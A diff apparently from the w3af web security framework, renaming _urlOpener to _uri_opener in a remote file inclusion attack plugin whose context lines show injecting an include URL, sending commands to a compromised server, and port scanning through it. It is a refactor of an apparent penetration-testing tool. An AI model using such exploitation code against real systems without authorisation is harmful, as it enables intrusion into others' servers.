@@ -127,7 +127,7 @@ class remoteFileIncludeShell(baseAttackPlugin):
                         test_string = '<?#@!()&=?>'
                         
                         # Test if the current xss vuln works for us:
-                        function_reference = getattr(self._urlOpener, xss_vuln.getMethod())
+                        function_reference = getattr(self._uri_opener, xss_vuln.getMethod())
                         data_container = xss_vuln.getDc()
                         data_container[xss_vuln.getVar()] = test_string
 
@@ -185,7 +185,7 @@ class remoteFileIncludeShell(baseAttackPlugin):
 
             # Create the shell object
             shell_obj = rfi_shell( vuln_obj )
-            shell_obj.setUrlOpener( self._urlOpener )
+            shell_obj.setUrlOpener( self._uri_opener )
             shell_obj.set_cut( self._header_length, self._footer_length )
             shell_obj.setExploitDc( self._exploit_dc )
             return shell_obj
@@ -194,7 +194,7 @@ class remoteFileIncludeShell(baseAttackPlugin):
 
             # Create the portscan shell object
             shell_obj = portscan_shell( vuln_obj )
-            shell_obj.setUrlOpener( self._urlOpener )
+            shell_obj.setUrlOpener( self._uri_opener )
             return shell_obj
 
         else:
@@ -228,7 +228,7 @@ class remoteFileIncludeShell(baseAttackPlugin):
                                       webroot_path)
             
             # Prepare for exploitation...
-            function_reference = getattr(self._urlOpener, vuln.getMethod())
+            function_reference = getattr(self._uri_opener, vuln.getMethod())
             data_container = vuln.getDc()
             data_container[vuln.getVar()] = url_to_include
 
@@ -255,7 +255,7 @@ class remoteFileIncludeShell(baseAttackPlugin):
             #    We get here when it was impossible to create a RFI shell, but we
             #    still might be able to do some interesting stuff
             #
-            function_reference = getattr( self._urlOpener , vuln.getMethod() )
+            function_reference = getattr( self._uri_opener , vuln.getMethod() )
             data_container = vuln.getDc()
             
             #    A port that should "always" be closed,
@@ -408,7 +408,7 @@ class portscan_shell(shell):
         port_open_dc = port_open_dc.copy()
         port_open_dc[ self.getVar() ] = 'http://%s:%s/' % (host, port)
                 
-        function_reference = getattr( self._urlOpener , self.getMethod() )
+        function_reference = getattr( self._uri_opener , self.getMethod() )
         try:
             http_response = function_reference( self.getURL(), str(port_open_dc) )
         except w3afException, w3:
@@ -470,7 +470,7 @@ class rfi_shell(exec_shell):
         e_dc = e_dc.copy()
         e_dc['cmd'] = command
         
-        function_reference = getattr(self._urlOpener, self.getMethod())
+        function_reference = getattr(self._uri_opener, self.getMethod())
         try:
             http_res = function_reference(self.getURL(), str(e_dc))
         except w3afException, w3:
